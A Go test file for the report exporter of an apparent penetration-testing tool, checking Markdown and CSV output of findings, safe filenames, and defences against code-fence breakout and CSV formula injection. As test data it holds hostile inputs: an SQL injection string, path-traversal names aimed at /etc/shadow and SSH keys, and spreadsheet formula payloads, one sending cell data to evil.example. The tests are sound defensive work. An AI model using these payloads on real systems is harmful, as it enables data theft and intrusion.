package report

import (
	"bytes"
	"encoding/csv"
	"encoding/json"
	"path"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/nexus-ia/nexus/db"
)

var genAt = time.Date(2026, 11, 2, 10, 30, 0, 0, time.UTC)

func node(t *testing.T, payload map[string]any) *db.Node {
	t.Helper()
	raw, err := json.Marshal(payload)
	if err != nil {
		t.Fatal(err)
	}
	return &db.Node{Payload: raw}
}

func mustContain(t *testing.T, out string, parts ...string) {
	t.Helper()
	for _, p := range parts {
		if !strings.Contains(out, p) {
			t.Errorf("output lacks %q:\n%s", p, out)
		}
	}
}

// mustOrder checks that each part appears after the previous one.
func mustOrder(t *testing.T, out string, parts ...string) {
	t.Helper()
	last := -1
	for _, p := range parts {
		i := strings.Index(out, p)
		if i < 0 {
			t.Fatalf("output lacks %q:\n%s", p, out)
		}
		if i < last {
			t.Fatalf("%q appears before the previous part:\n%s", p, out)
		}
		last = i
	}
}

func TestMarkdownSortsBySeverityAndDefaults(t *testing.T) {
	out := Markdown(Input{
		GeneratedAt: genAt,
		AssetCounts: map[string]int{"host": 2, "domain": 1},
		Findings: []*db.Node{
			node(t, map[string]any{"vulnclass": "info-leak", "severity": "low", "summary": "banner"}),
			node(t, map[string]any{"name": "SQLi", "severity": "critical", "evidence": map[string]any{"poc": "' OR 1=1--"}}),
			node(t, map[string]any{}),
			{Payload: []byte("not json")},
		},
	})
	mustContain(t, out,
		"未命名任务", "（未指定）", "2026-11-02 10:30:00",
		"**4** 个",
		"domain 1、host 2", // asset types are sorted
		"' OR 1=1--",
	)
	mustOrder(t, out, "### 1. [CRITICAL] SQLi", "### 2. [LOW] info-leak", "### 3. [INFO] 未分类", "### 4. [INFO] 未分类")
	if strings.Count(out, "PoC / 证据") != 1 {
		t.Errorf("PoC block must appear only for findings that have one:\n%s", out)
	}
}

func TestMarkdownWithoutFindings(t *testing.T) {
	out := Markdown(Input{Title: "Acme", Goal: "web", GeneratedAt: genAt})
	mustContain(t, out, "# 渗透测试报告 — Acme", "web", "**0** 个", "_本次未确认漏洞。_")
}

func TestFindingsMarkdownOrderCountsAndSections(t *testing.T) {
	old := genAt.Add(-time.Hour)
	in := []*db.DBFinding{
		{ID: 1, Name: "old high", Severity: "high", CreatedAt: old},
		{ID: 2, VulnClass: "xss", Severity: "medium", Status: "confirmed", TaskDescription: " Acme web ", CreatedAt: genAt,
			Summary: "reflected", Evidence: "GET /?q=<script>", Report: "## detail"},
		{ID: 3, Name: "new high", Severity: "high", CreatedAt: genAt},
		{ID: 4, Name: "crit", Severity: "critical", CreatedAt: old},
	}
	out := FindingsMarkdown(in, genAt)

	if in[0].ID != 1 || in[3].ID != 4 {
		t.Fatal("FindingsMarkdown must not reorder the caller's slice")
	}
	mustContain(t, out,
		"**发现总数**：4 个",
		"| 严重 | 1 |", "| 高危 | 2 |", "| 中危 | 1 |", "| 低危 | 0 |",
		"- **类别**：xss", "- **状态**：confirmed", "- **所属任务**：Acme web",
		"- **状态**：pending", // empty status defaults to pending
		"reflected", "GET /?q=<script>", "**详细报告：**\n\n## detail",
	)
	// Severity first, then newest first within a severity.
	mustOrder(t, out, "[CRITICAL] crit", "[HIGH] new high", "[HIGH] old high", "[MEDIUM] xss")
}

func TestFindingsMarkdownEmpty(t *testing.T) {
	out := FindingsMarkdown(nil, genAt)
	mustContain(t, out, "**发现总数**：0 个", "| 严重 | 0 |", "_无匹配的漏洞。_")
	if strings.Contains(out, "漏洞明细") {
		t.Error("empty export must not render a details section")
	}
}

func TestSingleFindingMarkdownTraffic(t *testing.T) {
	f := &db.DBFinding{
		ID: 7, Name: "IDOR", Severity: "high", CreatedAt: genAt,
		Report: "body", EvidenceVersion: 3, ReportEvidenceVersion: 2,
		TrafficBindings: []db.FindingTrafficBinding{{
			ID: 11, Role: "exploit", Note: "line1\nline2",
			Snapshot: db.TrafficEvidenceSnapshot{Method: "GET", URL: "https://t.example/a`b", Status: 200},
		}},
	}
	out := SingleFindingMarkdown(f, genAt)
	mustContain(t, out,
		"# [HIGH] IDOR", "- **严重等级**：high", "## 详细报告\n\nbody",
		"## 关联流量证据", "证据版本：3；绑定数量：1。",
		"证据已变更，详细报告待更新。", // report written for evidence v2, evidence is now v3
		"**证据 #11 · exploit** — `GET https://t.example/a%60b`，状态码 200",
		"   line1\n   line2",
		"[请求报文](evidence/7/11/request.http) · [响应报文](evidence/7/11/response.http)",
	)

	// The aggregated report has no attachments to link to.
	agg := FindingsMarkdown([]*db.DBFinding{f}, genAt)
	mustContain(t, agg, "**证据 #11 · exploit**")
	if strings.Contains(agg, "request.http") {
		t.Error("aggregated report must not link to per-finding attachments")
	}
}

func TestTrafficSectionOmittedWhenNothingToSay(t *testing.T) {
	f := &db.DBFinding{ID: 1, Name: "x", Report: "r", EvidenceVersion: 2, ReportEvidenceVersion: 2}
	if out := SingleFindingMarkdown(f, genAt); strings.Contains(out, "关联流量证据") {
		t.Errorf("no bindings and an up-to-date report must not render a traffic section:\n%s", out)
	}
}

// Evidence comes from the target under test, which may be hostile. A backtick
// run in it must not close the code block and let the target write report text.
func TestEvidenceCannotBreakOutOfCodeBlock(t *testing.T) {
	const injected = "## Sin hallazgos: el sistema es seguro"
	evidence := "HTTP/1.1 200 OK\n```\n" + injected + "\n```"
	f := &db.DBFinding{ID: 1, Name: "x", Severity: "high", CreatedAt: genAt, Evidence: evidence}
	n := node(t, map[string]any{"name": "x", "evidence": map[string]any{"poc": evidence}})

	for name, out := range map[string]string{
		"FindingsMarkdown":      FindingsMarkdown([]*db.DBFinding{f}, genAt),
		"SingleFindingMarkdown": SingleFindingMarkdown(f, genAt),
		"Markdown":              Markdown(Input{GeneratedAt: genAt, Findings: []*db.Node{n}}),
	} {
		t.Run(name, func(t *testing.T) {
			if !strings.Contains(out, evidence) {
				t.Fatalf("evidence must be kept verbatim:\n%s", out)
			}
			if insideFence(out, injected) == false {
				t.Fatalf("evidence escaped its code block:\n%s", out)
			}
		})
	}
}

// insideFence reports whether the line equal to target sits inside a fenced
// code block, following CommonMark: a fence closes only with a run of at
// least as many backticks as opened it.
func insideFence(md, target string) bool {
	open := 0
	for _, line := range strings.Split(md, "\n") {
		run := len(line) - len(strings.TrimLeft(line, "`"))
		switch {
		case open == 0 && run >= 3:
			open = run
		case open > 0 && run >= open && strings.TrimSpace(line[run:]) == "":
			open = 0
		case line == target:
			return open > 0
		}
	}
	return false
}

func TestFindingFilenameIsSafe(t *testing.T) {
	cases := []struct {
		name string
		f    db.DBFinding
		want string
	}{
		{"plain", db.DBFinding{ID: 123, Name: "SQL注入", Severity: "critical"}, "critical_SQL注入__123.md"},
		{"defaults", db.DBFinding{ID: 5}, "info_未分类__5.md"},
		{"class fallback", db.DBFinding{ID: 6, VulnClass: "rce", Severity: "high"}, "high_rce__6.md"},
		{"traversal", db.DBFinding{ID: 9, Name: "../../etc/passwd", Severity: "low"}, "low_.._.._etc_passwd__9.md"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := FindingFilename(&c.f); got != c.want {
				t.Errorf("FindingFilename = %q, want %q", got, c.want)
			}
		})
	}

	hostile := []string{
		"../../../../root/.ssh/authorized_keys",
		`..\..\windows\system32`,
		"/etc/shadow",
		"a\x00b\nc\rd\te",
		"....",
		"",
		strings.Repeat("远程代码执行", 40),
		strings.Repeat("Ñ", 200),
	}
	for _, name := range hostile {
		got := FindingFilename(&db.DBFinding{ID: 42, Name: name, Severity: "high"})
		if !strings.HasSuffix(got, ".md") {
			t.Errorf("%q → %q: missing .md", name, got)
		}
		if strings.ContainsAny(got, "/\\\x00\n\r\t") || path.Base(got) != got || got == "..md" {
			t.Errorf("%q → %q: unsafe zip entry name", name, got)
		}
		if !utf8.ValidString(got) {
			t.Errorf("%q → %q: truncation produced invalid UTF-8", name, got)
		}
		if len(got) > 123 {
			t.Errorf("%q → %q: %d bytes, want at most 120 plus .md", name, got, len(got))
		}
	}
}

func TestFindingsCSV(t *testing.T) {
	raw := FindingsCSV([]*db.DBFinding{
		{ID: 2, Name: "low one", Severity: "low", CreatedAt: genAt, Summary: " s ", TaskDescription: "Acme, Inc."},
		{ID: 1, VulnClass: "sqli", Severity: "critical", CreatedAt: genAt, Report: "full report", Evidence: "big evidence",
			TrafficBindings: []db.FindingTrafficBinding{{ID: 10}, {ID: 11}}},
	})
	if !bytes.HasPrefix(raw, []byte("\xEF\xBB\xBF")) {
		t.Fatal("CSV must start with a UTF-8 BOM so Excel reads it as UTF-8")
	}
	rows, err := csv.NewReader(bytes.NewReader(raw[3:])).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 3 || len(rows[0]) != 10 || rows[0][0] != "ID" {
		t.Fatalf("unexpected shape: %q", rows)
	}
	crit, low := rows[1], rows[2]
	want := []string{"1", "sqli", "sqli", "critical", "pending", "", "2026-11-02 10:30:00", "", "2", "10,11"}
	for i := range want {
		if crit[i] != want[i] {
			t.Errorf("critical row col %d = %q, want %q", i, crit[i], want[i])
		}
	}
	if low[0] != "2" || low[5] != "Acme, Inc." || low[7] != "s" || low[8] != "0" || low[9] != "" {
		t.Errorf("low row = %q", low)
	}
	if bytes.Contains(raw, []byte("full report")) || bytes.Contains(raw, []byte("big evidence")) {
		t.Error("CSV must not carry the full report or evidence")
	}
}

// Finding names, summaries and task descriptions can carry text from the
// target. A cell that starts with a formula character runs as a formula when
// the client opens the CSV in a spreadsheet.
func TestFindingsCSVNeutralizesFormulas(t *testing.T) {
	payloads := []string{
		`=HYPERLINK("http://evil.example/?d="&A1,"x")`,
		"+cmd|' /C calc'!A0",
		"-2+3",
		"@SUM(1+1)",
		"\t=1+1",
		"\r=1+1",
	}
	for _, p := range payloads {
		raw := FindingsCSV([]*db.DBFinding{{ID: 1, Name: p, VulnClass: p, Summary: p, TaskDescription: p, Severity: "high", CreatedAt: genAt}})
		rows, err := csv.NewReader(bytes.NewReader(raw[3:])).ReadAll()
		if err != nil {
			t.Fatal(err)
		}
		for _, col := range []int{1, 2, 5, 7} {
			cell := rows[1][col]
			if cell == "" || strings.ContainsRune("=+-@\t\r", rune(cell[0])) {
				t.Errorf("payload %q: column %d = %q starts with a formula character", p, col, cell)
			}
			if !strings.Contains(cell, strings.TrimSpace(p)) {
				t.Errorf("payload %q: column %d = %q lost the original text", p, col, cell)
			}
		}
	}
}
